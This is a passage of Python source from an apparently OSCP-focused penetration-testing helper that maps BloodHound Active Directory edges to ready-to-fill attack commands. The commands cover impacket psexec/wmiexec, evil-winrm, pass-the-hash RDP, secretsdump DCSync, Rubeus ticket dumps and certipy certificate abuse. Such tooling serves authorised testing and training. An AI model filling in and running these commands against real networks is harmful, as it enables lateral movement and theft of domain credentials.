"""
Blood-trail Query to Attack Command Mappings v2

DRY mapping system that:
- Maps bloodtrail query IDs to CRACK command database IDs
- Specifies which result fields contain arrays vs single values
- Defines access types for conditional command filtering
- Filters out invalid targets (groups misused as computers)
"""

import json
from dataclasses import dataclass
from functools import lru_cache
from pathlib import Path
from typing import Dict, List, Any, Optional


# =============================================================================
# LATERAL MOVEMENT TECHNIQUE METADATA (multi-technique per access type)
# =============================================================================

@dataclass
class TechniqueInfo:
    """
    Lateral movement technique metadata for educational command suggestions.

    Each technique provides multiple command templates (one per credential type)
    along with OSCP-relevant context about when, why, and how to use it.
    """
    name: str                           # Human-readable technique name
    command_templates: Dict[str, str]   # cred_type -> command template
    ports: List[int]                    # Required network ports
    requirements: List[str]             # Prerequisites for this technique
    noise_level: str                    # Detection risk: low, medium, high
    advantages: str                     # Why use this technique
    disadvantages: str                  # Limitations / risks
    oscp_relevance: str                 # OSCP exam relevance: high, medium, low


# Multiple techniques available for each access type
# Ordered by reliability/common usage (first is default)
LATERAL_TECHNIQUES: Dict[str, List[TechniqueInfo]] = {
    "AdminTo": [
        TechniqueInfo(
            name="PsExec (Impacket)",
            command_templates={
                "password": "impacket-psexec '<DOMAIN>/<USERNAME>:<CRED_VALUE>'@<TARGET>",
                "ntlm-hash": "impacket-psexec -hashes :<CRED_VALUE> '<DOMAIN>/<USERNAME>'@<TARGET>",
                "kerberos-ticket": "KRB5CCNAME=<CRED_VALUE> impacket-psexec -k -no-pass '<DOMAIN>/<USERNAME>'@<TARGET>",
            },
            ports=[445],
            requirements=["SMB port 445 open", "ADMIN$ share accessible", "Local admin rights"],
            noise_level="high",
            advantages="Reliable, gets SYSTEM shell, works with hash/ticket",
            disadvantages="Creates service, logged in Event Log, AV detection",
            oscp_relevance="high",
        ),
        TechniqueInfo(
            name="WMIExec (Impacket)",
            command_templates={
                "password": "impacket-wmiexec '<DOMAIN>/<USERNAME>:<CRED_VALUE>'@<TARGET>",
                "ntlm-hash": "impacket-wmiexec -hashes :<CRED_VALUE> '<DOMAIN>/<USERNAME>'@<TARGET>",
                "kerberos-ticket": "KRB5CCNAME=<CRED_VALUE> impacket-wmiexec -k -no-pass '<DOMAIN>/<USERNAME>'@<TARGET>",
            },
            ports=[135],
            requirements=["RPC port 135 open", "WMI access", "Local admin rights"],
            noise_level="medium",
            advantages="No service creation, runs as user, uses WMI (legitimate)",
            disadvantages="No SYSTEM shell, requires RPC, slower than PsExec",
            oscp_relevance="high",
        ),
        TechniqueInfo(
            name="SMBExec (Impacket)",
            command_templates={
                "password": "impacket-smbexec '<DOMAIN>/<USERNAME>:<CRED_VALUE>'@<TARGET>",
                "ntlm-hash": "impacket-smbexec -hashes :<CRED_VALUE> '<DOMAIN>/<USERNAME>'@<TARGET>",
                "kerberos-ticket": "KRB5CCNAME=<CRED_VALUE> impacket-smbexec -k -no-pass '<DOMAIN>/<USERNAME>'@<TARGET>",
            },
            ports=[445],
            requirements=["SMB port 445 open", "ADMIN$ share accessible", "Local admin rights"],
            noise_level="high",
            advantages="SYSTEM shell, creates fewer artifacts than PsExec",
            disadvantages="Service creation, Event Log entries, AV detection",
            oscp_relevance="medium",
        ),
        TechniqueInfo(
            name="DCOMExec (Impacket)",
            command_templates={
                "password": "impacket-dcomexec -object MMC20 '<DOMAIN>/<USERNAME>:<CRED_VALUE>'@<TARGET>",
                "ntlm-hash": "impacket-dcomexec -object MMC20 -hashes :<CRED_VALUE> '<DOMAIN>/<USERNAME>'@<TARGET>",
                "kerberos-ticket": "KRB5CCNAME=<CRED_VALUE> impacket-dcomexec -object MMC20 -k -no-pass '<DOMAIN>/<USERNAME>'@<TARGET>",
            },
            ports=[135],
            requirements=["RPC port 135 open", "DCOM enabled", "Local admin rights"],
            noise_level="medium",
            advantages="Uses DCOM (often overlooked), runs as user",
            disadvantages="Requires RPC, less reliable than PsExec/WMI",
            oscp_relevance="medium",
        ),
    ],
    "CanPSRemote": [
        TechniqueInfo(
            name="Evil-WinRM",
            command_templates={
                "password": "evil-winrm -i <TARGET> -u <USERNAME> -p '<CRED_VALUE>'",
                "ntlm-hash": "evil-winrm -i <TARGET> -u <USERNAME> -H <CRED_VALUE>",
                "kerberos-ticket": "KRB5CCNAME=<CRED_VALUE> evil-winrm -i <TARGET> -r <DOMAIN>",
            },
            ports=[5985, 5986],
            requirements=["WinRM port 5985/5986 open", "Remote Management Users group"],
            noise_level="low",
            advantages="Interactive PowerShell, file upload/download, stealthy",
            disadvantages="Requires WinRM, may need Remote Management Users membership",
            oscp_relevance="high",
        ),
        TechniqueInfo(
            name="WinRS (Windows)",
            command_templates={
                "password": "winrs -r:<TARGET> -u:<DOMAIN>\\<USERNAME> -p:<CRED_VALUE> cmd",
            },
            ports=[5985, 5986],
            requirements=["WinRM port 5985/5986 open", "Windows client", "Remote Management Users group"],
            noise_level="low",
            advantages="Native Windows, no extra tools, trusted binary",
            disadvantages="Windows-only, less interactive than Evil-WinRM",
            oscp_relevance="medium",
        ),
    ],
    "CanRDP": [
        TechniqueInfo(
            name="xfreerdp",
            command_templates={
                "password": "xfreerdp /v:<TARGET> /u:<USERNAME> /p:'<CRED_VALUE>' /d:<DOMAIN> +clipboard",
                "ntlm-hash": "xfreerdp /v:<TARGET> /u:<USERNAME> /pth:<CRED_VALUE> /d:<DOMAIN> +clipboard",
            },
            ports=[3389],
            requirements=["RDP port 3389 open", "Remote Desktop Users or Administrators group"],
            noise_level="low",
            advantages="Full GUI access, file transfer, clipboard sharing",
            disadvantages="Visible session (noisy), may disconnect other users",
            oscp_relevance="high",
        ),
        TechniqueInfo(
            name="rdesktop",
            command_templates={
                "password": "rdesktop -u <USERNAME> -p '<CRED_VALUE>' -d <DOMAIN> <TARGET>",
            },
            ports=[3389],
            requirements=["RDP port 3389 open", "Remote Desktop Users or Administrators group"],
            noise_level="low",
            advantages="Lightweight, works on older systems",
            disadvantages="Fewer features than xfreerdp, password only",
            oscp_relevance="low",
        ),
    ],
    "ExecuteDCOM": [
        TechniqueInfo(
            name="DCOMExec (MMC20)",
            command_templates={
                "password": "impacket-dcomexec -object MMC20 '<DOMAIN>/<USERNAME>:<CRED_VALUE>'@<TARGET>",
                "ntlm-hash": "impacket-dcomexec -object MMC20 -hashes :<CRED_VALUE> '<DOMAIN>/<USERNAME>'@<TARGET>",
                "kerberos-ticket": "KRB5CCNAME=<CRED_VALUE> impacket-dcomexec -object MMC20 -k -no-pass '<DOMAIN>/<USERNAME>'@<TARGET>",
            },
            ports=[135],
            requirements=["RPC port 135 open", "DCOM enabled", "Local admin or DCOM permission"],
            noise_level="medium",
            advantages="Uses MMC20 Application COM object, often overlooked",
            disadvantages="Requires RPC, may be blocked by firewall",
            oscp_relevance="medium",
        ),
    ],
}


# =============================================================================
# CREDENTIAL CONVERSION ATTACKS (Overpass the Hash)
# =============================================================================

# When user has NTLM hash but target requires Kerberos authentication
# Converts NTLM hash to Kerberos TGT for environments blocking NTLM
CREDENTIAL_CONVERSION: Dict[str, TechniqueInfo] = {
    "overpass-the-hash": TechniqueInfo(
        name="Overpass the Hash (NTLM → TGT)",
        command_templates={
            "ntlm-hash": "impacket-getTGT -hashes :<CRED_VALUE> '<DOMAIN>/<USERNAME>'",
        },
        ports=[88],
        requirements=["Kerberos port 88 reachable", "Valid NTLM hash", "User account not disabled"],
        noise_level="low",
        advantages="Converts hash to TGT for Kerberos-only targets, evades NTLM monitoring",
        disadvantages="Requires Kerberos access, TGT expires (10h default)",
        oscp_relevance="high",
    ),
}


# =============================================================================
# TICKET ATTACKS (Pass the Ticket)
# =============================================================================

# Using/importing Kerberos tickets for authentication
TICKET_ATTACKS: Dict[str, TechniqueInfo] = {
    "export-tickets": TechniqueInfo(
        name="Export Kerberos Tickets (Rubeus)",
        command_templates={
            # Windows - run on compromised host with session
            "session": "Rubeus.exe dump /luid:<LUID> /service:krbtgt /nowrap",
        },
        ports=[],
        requirements=["Local admin on host with target session", "Target logged in"],
        noise_level="medium",
        advantages="Extract tickets for offline use, enables pass-the-ticket",
        disadvantages="Requires session on target, may trigger EDR",
        oscp_relevance="high",
    ),
    "pass-the-ticket": TechniqueInfo(
        name="Pass the Ticket (ccache)",
        command_templates={
            "kerberos-ticket": "export KRB5CCNAME=<CRED_VALUE>",
        },
        ports=[88],
        requirements=["Valid ccache file", "Ticket not expired", "Matching SPN"],
        noise_level="low",
        advantages="Reuse captured tickets, no hash needed, avoids password cracking",
        disadvantages="Tickets expire, need correct service ticket",
        oscp_relevance="high",
    ),
    "convert-kirbi-ccache": TechniqueInfo(
        name="Convert .kirbi to .ccache",
        command_templates={
            "kirbi-file": "impacket-ticketConverter <CRED_VALUE> <OUTPUT>.ccache",
        },
        ports=[],
        requirements=["Valid .kirbi file from Rubeus/Mimikatz"],
        noise_level="low",
        advantages="Convert Windows tickets to Linux format",
        disadvantages="Requires initial ticket extraction",
        oscp_relevance="medium",
    ),
}


# =============================================================================
# HELPER FUNCTIONS FOR LATERAL TECHNIQUES
# =============================================================================

def get_techniques_for_access(access_type: str) -> List[TechniqueInfo]:
    """
    Get all available lateral movement techniques for an access type.

    Args:
        access_type: BloodHound edge type (AdminTo, CanPSRemote, etc.)

    Returns:
        List of TechniqueInfo objects, ordered by reliability
    """
    return LATERAL_TECHNIQUES.get(access_type, [])


def get_technique_command(
    access_type: str,
    cred_type: str,
    technique_index: int = 0
) -> Optional[str]:
    """
    Get command template for a specific technique and credential type.

    Args:
        access_type: BloodHound edge type
        cred_type: password, ntlm-hash, kerberos-ticket
        technique_index: Which technique to use (0 = default/first)

    Returns:
        Command template string or None
    """
    techniques = LATERAL_TECHNIQUES.get(access_type, [])
    if not techniques or technique_index >= len(techniques):
        return None
    return techniques[technique_index].command_templates.get(cred_type)


def needs_overpass_the_hash(cred_type: str, target_ports: List[int]) -> bool:
    """
    Determine if Overpass the Hash is needed.

    Needed when:
    - User has NTLM hash
    - Target only accepts Kerberos (port 88 open, 445 closed)

    Args:
        cred_type: Current credential type
        target_ports: List of open ports on target

    Returns:
        True if Overpass the Hash should be suggested
    """
    if cred_type != "ntlm-hash":
        return False
    # If SMB is blocked but Kerberos is available
    return 88 in target_ports and 445 not in target_ports


# =============================================================================
# QUERY MAPPINGS - DRY structure with array/field awareness
# =============================================================================

# Each mapping defines:
#   commands:      List of CRACK command IDs to suggest
#   access_type:   Edge type for conditional filtering (AdminTo, CanRDP, etc.)
#   array_field:   Result field containing array of targets (for expansion)
#   user_field:    Result field containing the user principal
#   target_field:  For single-target queries (user IS the target)
#   filter_groups: Skip group names that aren't valid computer targets
#   domain_level:  True for domain-wide commands (DCSync, etc.)

@lru_cache(maxsize=1)
def _load_query_mappings() -> Dict[str, Any]:
    """Load query command mappings from JSON file."""
    json_path = Path(__file__).parent / "data" / "query_mappings.json"
    with open(json_path, "r") as f:
        return json.load(f)


# Lazy-loaded on first access
QUERY_COMMAND_MAPPINGS: Dict[str, Any] = _load_query_mappings()


# =============================================================================
# CREDENTIAL TYPE -> COMMAND MAPPINGS (for pwned user follow-up)
# =============================================================================

# Maps credential type + access type to appropriate command IDs
# Used by pwned_tracker to generate copy-paste ready commands

CRED_TYPE_COMMANDS: Dict[str, Dict[str, List[str]]] = {
    "password": {
        "AdminTo": ["impacket-psexec", "impacket-wmiexec", "impacket-smbexec"],
        "CanRDP": ["xfreerdp-connect"],
        "CanPSRemote": ["evil-winrm-shell"],
        "ExecuteDCOM": ["impacket-wmiexec"],
        "DCSync": ["ad-dcsync-impacket-secretsdump-user"],
    },
    "ntlm-hash": {
        "AdminTo": ["psexec-pth", "wmiexec-pth", "smbexec-pth"],
        "CanRDP": ["xfreerdp-pth"],
        "CanPSRemote": ["evil-winrm-hash"],
        "ExecuteDCOM": ["wmiexec-pth"],
        "DCSync": ["ad-dcsync-impacket-secretsdump-hash"],
    },
    "kerberos-ticket": {
        "AdminTo": ["psexec-kerberos", "wmiexec-kerberos"],
        "CanRDP": ["xfreerdp-kerberos"],
        "CanPSRemote": ["evil-winrm-kerberos"],
        "ExecuteDCOM": ["wmiexec-kerberos"],
        "DCSync": ["ad-dcsync-impacket-secretsdump-kerberos"],
    },
    "certificate": {
        "AdminTo": ["certipy-auth-pth"],
        "CanRDP": ["certipy-auth-rdp"],
        "CanPSRemote": ["certipy-auth-winrm"],
        "DCSync": ["certipy-auth-dcsync"],
    },
}


# Command templates by credential type (with auto-fill placeholders)
# These are the actual command strings with credential placeholders filled
CRED_TYPE_TEMPLATES: Dict[str, Dict[str, str]] = {
    "password": {
        "AdminTo": "impacket-psexec '<DOMAIN>/<USERNAME>:<CRED_VALUE>'@<TARGET>",
        "CanRDP": "xfreerdp /v:<TARGET> /u:<USERNAME> /p:'<CRED_VALUE>' /d:<DOMAIN>",
        "CanPSRemote": "evil-winrm -i <TARGET> -u <USERNAME> -p '<CRED_VALUE>'",
        "DCSync": "impacket-secretsdump '<DOMAIN>/<USERNAME>:<CRED_VALUE>'@<DC_IP>",
        "secretsdump": "impacket-secretsdump '<DOMAIN>/<USERNAME>:<CRED_VALUE>'@<TARGET>",
    },
    "ntlm-hash": {
        "AdminTo": "impacket-psexec -hashes :<CRED_VALUE> '<DOMAIN>/<USERNAME>'@<TARGET>",
        "CanRDP": "xfreerdp /v:<TARGET> /u:<USERNAME> /pth:<CRED_VALUE> /d:<DOMAIN>",
        "CanPSRemote": "evil-winrm -i <TARGET> -u <USERNAME> -H <CRED_VALUE>",
        "DCSync": "impacket-secretsdump -hashes :<CRED_VALUE> '<DOMAIN>/<USERNAME>'@<DC_IP>",
        "secretsdump": "impacket-secretsdump -hashes :<CRED_VALUE> '<DOMAIN>/<USERNAME>'@<TARGET>",
    },
    "kerberos-ticket": {
        "AdminTo": "KRB5CCNAME=<CRED_VALUE> impacket-psexec -k -no-pass '<DOMAIN>/<USERNAME>'@<TARGET>",
        "CanRDP": "xfreerdp /v:<TARGET> /u:<USERNAME> /d:<DOMAIN> /kerberos",
        "CanPSRemote": "KRB5CCNAME=<CRED_VALUE> evil-winrm -i <TARGET> -r <DOMAIN>",
        "DCSync": "KRB5CCNAME=<CRED_VALUE> impacket-secretsdump -k -no-pass '<DOMAIN>/<USERNAME>'@<DC_IP>",
        "secretsdump": "KRB5CCNAME=<CRED_VALUE> impacket-secretsdump -k -no-pass '<DOMAIN>/<USERNAME>'@<TARGET>",
    },
    "certificate": {
        "AdminTo": "certipy auth -pfx <CRED_VALUE> -domain <DOMAIN> -dc-ip <DC_IP> && impacket-psexec -hashes :<NTLM> '<DOMAIN>/<USERNAME>'@<TARGET>",
        "CanRDP": "certipy auth -pfx <CRED_VALUE> -domain <DOMAIN> -dc-ip <DC_IP> && xfreerdp /v:<TARGET> /u:<USERNAME> /pth:<NTLM>",
        "CanPSRemote": "certipy auth -pfx <CRED_VALUE> -domain <DOMAIN> -dc-ip <DC_IP> && evil-winrm -i <TARGET> -u <USERNAME> -H <NTLM>",
        "DCSync": "certipy auth -pfx <CRED_VALUE> -domain <DOMAIN> -dc-ip <DC_IP> && impacket-secretsdump -hashes :<NTLM> '<DOMAIN>/<USERNAME>'@<DC_IP>",
    },
}


def get_commands_for_cred_type(cred_type: str, access_type: str) -> List[str]:
    """
    Get command IDs for a credential type and access type combination.

    Args:
        cred_type: password, ntlm-hash, kerberos-ticket, certificate
        access_type: AdminTo, CanRDP, CanPSRemote, etc.

    Returns:
        List of command IDs
    """
    return CRED_TYPE_COMMANDS.get(cred_type, {}).get(access_type, [])


def get_command_template(cred_type: str, access_type: str) -> Optional[str]:
    """
    Get ready-to-fill command template for credential type and access type.

    Args:
        cred_type: password, ntlm-hash, kerberos-ticket, certificate
        access_type: AdminTo, CanRDP, CanPSRemote, etc.

    Returns:
        Command template string with placeholders
    """
    return CRED_TYPE_TEMPLATES.get(cred_type, {}).get(access_type)


def fill_command(
    template: str,
    username: str = "",
    target: str = "",
    target_ip: str = "",
    domain: str = "",
    dc_ip: str = "",
    password: str = "",
    ntlm_hash: str = "",
    cred_value: str = "",
    listener_ip: str = "",
) -> str:
    """
    Universal command placeholder filler with IP preference.

    Fills all standard placeholders plus optional credentials.
    Credentials only fill if non-empty string provided.

    IP Preference Logic:
        - If target_ip is provided, use it for <TARGET>, <COMPUTER>, and <TARGET_IP>
        - Otherwise, fallback to target (FQDN)
        - This allows commands to use IP addresses when available

    Args:
        template: Command template with <PLACEHOLDERS>
        username: Username (UPN format OK - will extract just username)
        target: Target computer FQDN (e.g., FILES04.CORP.COM)
        target_ip: Resolved IP address (e.g., 10.0.0.15) - PREFERRED over target
        domain: Domain name
        dc_ip: Domain controller IP/hostname (auto-inferred if not provided)
        password: Password credential (fills <PASSWORD>)
        ntlm_hash: NTLM hash credential (fills <HASH>, <NTLM_HASH>)
        cred_value: Generic credential value (fills <CRED_VALUE>)
        listener_ip: Listener IP for coercion commands (fills <LISTENER_IP>)

    Returns:
        Filled command string

    Examples:
        >>> # With IP (preferred)
        >>> fill_command(
        ...     "psexec <TARGET>",
        ...     target="FILES04.CORP.COM",
        ...     target_ip="10.0.0.15"
        ... )
        'psexec 10.0.0.15'

        >>> # Without IP (fallback to FQDN)
        >>> fill_command(
        ...     "psexec <TARGET>",
        ...     target="FILES04.CORP.COM"
        ... )
        'psexec FILES04.CORP.COM'

        >>> # Coercion command with listener
        >>> fill_command(
        ...     "petitpotam.py <LISTENER_IP> <TARGET_IP>",
        ...     target_ip="10.0.0.1",
        ...     listener_ip="10.0.0.50"
        ... )
        'petitpotam.py 10.0.0.50 10.0.0.1'
    """
    result = template

    # === User placeholders ===
    if username:
        # Handle UPN format (MIKE@CORP.COM -> MIKE)
        clean_user = extract_username(username) if "@" in username else username
        result = result.replace("<USERNAME>", clean_user)
        result = result.replace("<USER>", clean_user)

    # === Target placeholders - PREFER IP OVER FQDN ===
    # Use IP if available, otherwise fallback to FQDN
    effective_target = target_ip if target_ip else target
    if effective_target:
        result = result.replace("<TARGET>", effective_target)
        result = result.replace("<COMPUTER>", effective_target)
        result = result.replace("<TARGET_IP>", effective_target)

    # === Listener placeholder (for coercion commands) ===
    if listener_ip:
        result = result.replace("<LISTENER_IP>", listener_ip)

    # === Domain placeholders ===
    if domain:
        result = result.replace("<DOMAIN>", domain.lower())

    # === DC placeholders ===
    dc = dc_ip or (infer_dc_hostname(domain) if domain else "")
    if dc:
        result = result.replace("<DC_IP>", dc)
        result = result.replace("<DC>", dc)

    # === Credential placeholders (only if provided) ===
    if password:
        result = result.replace("<PASSWORD>", password)

    if ntlm_hash:
        result = result.replace("<HASH>", ntlm_hash)
        result = result.replace("<NTLM_HASH>", ntlm_hash)

    if cred_value:
        result = result.replace("<CRED_VALUE>", cred_value)

    return result


def fill_pwned_command(
    template: str,
    username: str,
    domain: str,
    target: str,
    cred_value: str,
    dc_ip: Optional[str] = None,
    target_ip: str = ""
) -> str:
    """
    Fill a command template with pwned user credentials.

    DEPRECATED: Use fill_command() instead for new code.
    This function is kept for backward compatibility.

    Args:
        template: Command template with placeholders
        username: Username
        domain: Domain name
        target: Target computer FQDN
        cred_value: Credential value
        dc_ip: Domain controller IP
        target_ip: Resolved IP address (preferred over target FQDN)
    """
    return fill_command(
        template=template,
        username=username,
        domain=domain,
        target=target,
        target_ip=target_ip,
        dc_ip=dc_ip or "",
        cred_value=cred_value,
    )


# =============================================================================
# EDGE TYPE -> COMMAND MAPPINGS (for attack sequence building)
# =============================================================================

EDGE_COMMAND_MAPPINGS: Dict[str, List[str]] = {
    # Access Edges
    "AdminTo": ["impacket-psexec", "impacket-wmiexec", "impacket-smbexec"],
    "CanRDP": ["xfreerdp-connect"],
    "CanPSRemote": ["evil-winrm-shell"],
    "ExecuteDCOM": ["impacket-wmiexec"],
    "HasSession": ["impacket-psexec"],  # Get shell to harvest creds

    # Permission Edges (ACL abuse)
    # Note: bloodyad-genericall, dacledit, owneredit, net-group-add not yet in DB
    # Using available alternatives until dedicated ACL commands are added
    "GenericAll": ["crackmapexec-smb-spray"],  # Reset password then spray
    "GenericWrite": ["impacket-getuserspns-kerberoast"],  # Add SPN then kerberoast
    "WriteDacl": [],  # TODO: add dacledit command
    "WriteOwner": [],  # TODO: add owneredit command
    "ForceChangePassword": ["crackmapexec-smb-spray"],  # Spray with new password
    "AddMember": [],  # TODO: add net-group-add command
    "Owns": ["crackmapexec-smb-spray"],  # Full control - reset password

    # Privilege Edges
    "GetChanges": ["ad-dcsync-impacket-secretsdump-user"],
    "GetChangesAll": ["ad-dcsync-impacket-secretsdump-user"],
    "AllExtendedRights": ["ad-dcsync-impacket-secretsdump-user"],

    # Credential Edges
    "ReadGMSAPassword": ["gmsadumper", "bloodyad-gmsa"],
    "ReadLAPSPassword": ["laps-password-cme", "laps-password-ldapsearch"],
    "AddKeyCredentialLink": ["certipy-shadow"],  # TODO: add pywhisker command
    "SyncLAPSPassword": ["laps-password-cme", "laps-password-ldapsearch"],

    # Delegation Edges
    "AllowedToDelegate": ["rubeus-s4u-impersonate", "impacket-getST-constrained"],
    "AllowedToAct": ["rbcd-getST", "rubeus-s4u-impersonate"],
    "AddAllowedToAct": ["rbcd-set-msds"],
    "WriteAccountRestrictions": ["rbcd-set-msds", "bloodyad-rbcd"],

    # ADCS Edges (Certificate Services)
    "ADCSESC1": ["certipy-req-esc1"],
    "ADCSESC3": ["certipy-req-esc1"],
    "ADCSESC4": ["certipy-req-esc4"],
    "ADCSESC5": ["certipy-find"],
    "ADCSESC6a": ["certipy-req-esc1"],
    "ADCSESC6b": ["certipy-req-esc1"],
    "ADCSESC7": ["certipy-req-esc7"],
    "ADCSESC9a": ["certipy-req-esc1", "certipy-auth"],
    "ADCSESC9b": ["certipy-req-esc1", "certipy-auth"],
    "ADCSESC10a": ["certipy-req-esc1", "certipy-auth"],
    "ADCSESC10b": ["certipy-shadow"],
    "ADCSESC13": ["certipy-req-esc1"],
    "GoldenCert": ["certipy-forge"],
    "Enroll": ["certipy-req-esc1", "certify-request"],
    "EnrollOnBehalfOf": ["certipy-req-esc1"],
    "ManageCA": ["certipy-req-esc7"],
    "ManageCertificates": ["certipy-req-esc7"],

    # Coercion Edges
    "CoerceToTGT": ["petitpotam-coerce", "coercer-coerce", "printerbug-trigger", "dfscoerce-trigger"],

    # SID/Trust Edges
    "HasSIDHistory": ["impacket-psexec", "impacket-wmiexec"],
    "TrustedBy": ["impacket-psexec"],

    # Other PrivEsc Edges
    "WriteSPN": ["impacket-getuserspns-kerberoast"],

    # Membership (informational)
    "MemberOf": [],
}


# =============================================================================
# HELPER FUNCTIONS
# =============================================================================

def extract_domain(upn: str) -> str:
    """Extract domain from UPN format. MIKE@CORP.COM -> CORP.COM"""
    if "@" in upn:
        return upn.split("@")[1]
    return ""


def extract_username(upn: str) -> str:
    """Extract username from UPN format. MIKE@CORP.COM -> MIKE"""
    if "@" in upn:
        return upn.split("@")[0]
    return upn


def infer_dc_hostname(domain: str) -> str:
    """
    Infer DC hostname from domain name.
    CORP.COM -> DC01.CORP.COM (common pattern)

    Note: This is best-effort. User may need to adjust for non-standard DC names.
    """
    if not domain:
        return "<DC_IP>"
    # Try common DC naming patterns
    return f"DC01.{domain}"


# =============================================================================
# GROUP NAME DETECTION (for filtering invalid targets)
# =============================================================================

# Common AD group patterns that should NOT be used as computer targets
GROUP_NAME_PATTERNS = [
    "DOMAIN CONTROLLERS",
    "DOMAIN ADMINS",
    "ENTERPRISE ADMINS",
    "ADMINISTRATORS",
    "SCHEMA ADMINS",
    "DNSADMINS",
    "CLONEABLE DOMAIN CONTROLLERS",
    "ENTERPRISE READ-ONLY DOMAIN CONTROLLERS",
    "PROTECTED USERS",
    "KEY ADMINS",
    "ENTERPRISE KEY ADMINS",
    "CERT PUBLISHERS",
    "RAS AND IAS SERVERS",
    "ALLOWED RODC PASSWORD REPLICATION GROUP",
    "DENIED RODC PASSWORD REPLICATION GROUP",
    "READ-ONLY DOMAIN CONTROLLERS",
    "GROUP POLICY CREATOR OWNERS",
    "DOMAIN COMPUTERS",
    "DOMAIN GUESTS",
    "DOMAIN USERS",
    "ACCOUNT OPERATORS",
    "SERVER OPERATORS",
    "PRINT OPERATORS",
    "BACKUP OPERATORS",
    "REPLICATOR",
]


def is_group_name(name: str) -> bool:
    """
    Detect if a name is a group (not a valid computer target).

    Groups like "DOMAIN CONTROLLERS@CORP.COM" should not be used
    as <TARGET> in attack commands.
    """
    if not name:
        return False
    upper = name.upper()
    # Check against known patterns
    for pattern in GROUP_NAME_PATTERNS:
        if pattern in upper:
            return True
    return False


# =============================================================================
# SENSITIVE PLACEHOLDERS (never auto-fill)
# =============================================================================

SENSITIVE_PLACEHOLDERS = {
    "<PASSWORD>",
    "<HASH>",
    "<NTLM_HASH>",
    "<LM_HASH>",
    "<TICKET>",
    "<PRIVATE_KEY>",
    "<TARGET_USER>",  # User to DCSync - needs manual selection
}


# =============================================================================
# ACCESS_TYPE_CATALOG - Single source of truth for access type metadata
# =============================================================================
# Consolidates reward, phase, priority, and reason_template into one structure.
#
# Priority range:
#   100-199: Privilege Escalation (domain compromise potential)
#   50-99: Lateral Movement (code execution, access)
#   0-49: Quick Wins (discovery, enumeration)


@dataclass
class AccessTypeInfo:
    """Consolidated metadata for a BloodHound access type (edge)."""
    reward: str
    phase: str
    priority: int
    reason_template: str


ACCESS_TYPE_CATALOG: Dict[Optional[str], AccessTypeInfo] = {
    # === PRIVILEGE ESCALATION (100-199) ===
    "DCSync": AccessTypeInfo(
        reward="Dump all domain password hashes including krbtgt",
        phase="Privilege Escalation",
        priority=199,
        reason_template="{user} has DCSync rights (GetChanges+GetChangesAll)",
    ),
    "GoldenCert": AccessTypeInfo(
        reward="Forge any certificate with compromised CA key",
        phase="Privilege Escalation",
        priority=198,
        reason_template="CA {target} key compromised - forge any certificate",
    ),
    "GenericAll": AccessTypeInfo(
        reward="Full control - reset passwords, modify group membership",
        phase="Privilege Escalation",
        priority=195,
        reason_template="{user} has GenericAll over {target}",
    ),
    "WriteOwner": AccessTypeInfo(
        reward="Take ownership then modify DACL for full control",
        phase="Privilege Escalation",
        priority=190,
        reason_template="{user} can take ownership of {target}",
    ),
    "WriteDacl": AccessTypeInfo(
        reward="Grant yourself additional permissions on object",
        phase="Privilege Escalation",
        priority=185,
        reason_template="{user} can modify DACL on {target}",
    ),
    "Owns": AccessTypeInfo(
        reward="Full object control - reset password or modify permissions",
        phase="Privilege Escalation",
        priority=180,
        reason_template="{user} owns {target} - full control",
    ),
    "ForceChangePassword": AccessTypeInfo(
        reward="Reset user password without knowing current",
        phase="Privilege Escalation",
        priority=175,
        reason_template="{user} can reset password for {target}",
    ),
    "AddKeyCredentialLink": AccessTypeInfo(
        reward="Add shadow credentials for certificate-based auth",
        phase="Privilege Escalation",
        priority=170,
        reason_template="{user} can add shadow credentials to {target}",
    ),
    "ReadGMSAPassword": AccessTypeInfo(
        reward="Retrieve cleartext gMSA password for authentication",
        phase="Privilege Escalation",
        priority=165,
        reason_template="{user} can read gMSA password for {target}",
    ),
    "ReadLAPSPassword": AccessTypeInfo(
        reward="Retrieve local admin password from LAPS",
        phase="Privilege Escalation",
        priority=160,
        reason_template="{user} can read LAPS password on {target}",
    ),
    "SyncLAPSPassword": AccessTypeInfo(
        reward="Domain-wide LAPS password retrieval",
        phase="Privilege Escalation",
        priority=158,
        reason_template="{user} has domain-wide LAPS sync rights",
    ),
    "AddMember": AccessTypeInfo(
        reward="Add yourself to privileged groups",
        phase="Privilege Escalation",
        priority=155,
        reason_template="{user} can add members to {target}",
    ),
    "GenericWrite": AccessTypeInfo(
        reward="Add SPN for Kerberoasting or modify attributes",
        phase="Privilege Escalation",
        priority=150,
        reason_template="{user} has GenericWrite on {target}",
    ),
    "WriteSPN": AccessTypeInfo(
        reward="Add SPN for targeted Kerberoasting attack",
        phase="Privilege Escalation",
        priority=145,
        reason_template="{user} can add SPN to {target} for targeted Kerberoasting",
    ),
    "ADCSESC1": AccessTypeInfo(
        reward="Request certificate as any user for domain admin access",
        phase="Privilege Escalation",
        priority=140,
        reason_template="{user} can request cert as any user via {target}",
    ),
    "ADCSESC3": AccessTypeInfo(
        reward="Enrollment agent abuse for user impersonation",
        phase="Privilege Escalation",
        priority=138,
        reason_template="{user} can enroll on behalf of others via {target}",
    ),
    "ADCSESC4": AccessTypeInfo(
        reward="Modify template to enable ESC1 vulnerability",
        phase="Privilege Escalation",
        priority=135,
        reason_template="{user} can modify template {target} for ESC1",
    ),
    "ADCSESC6a": AccessTypeInfo(
        reward="Request cert with arbitrary SAN for impersonation",
        phase="Privilege Escalation",
        priority=132,
        reason_template="{user} can exploit EDITF_ATTRIBUTESUBJECTALTNAME2 on {target}",
    ),
    "ADCSESC6b": AccessTypeInfo(
        reward="Bypass issuance requirements for unauthorized certs",
        phase="Privilege Escalation",
        priority=130,
        reason_template="{user} can bypass issuance requirements on {target}",
    ),
    "ADCSESC7": AccessTypeInfo(
        reward="Approve pending certificate requests as CA manager",
        phase="Privilege Escalation",
        priority=128,
        reason_template="{user} can manage CA {target} - approve pending requests",
    ),
    "ADCSESC5": AccessTypeInfo(
        reward="PKI object modification for certificate abuse",
        phase="Privilege Escalation",
        priority=125,
        reason_template="{user} can modify PKI object {target}",
    ),
    "ADCSESC9a": AccessTypeInfo(
        reward="Bypass security extension for certificate abuse",
        phase="Privilege Escalation",
        priority=122,
        reason_template="{user} can exploit no security extension on {target}",
    ),
    "ADCSESC9b": AccessTypeInfo(
        reward="Exploit weak certificate mapping for impersonation",
        phase="Privilege Escalation",
        priority=120,
        reason_template="{user} can exploit weak certificate mapping on {target}",
    ),
    "ADCSESC10a": AccessTypeInfo(
        reward="Exploit weak cert binding for authentication",
        phase="Privilege Escalation",
        priority=118,
        reason_template="{user} can exploit weak cert binding on {target}",
    ),
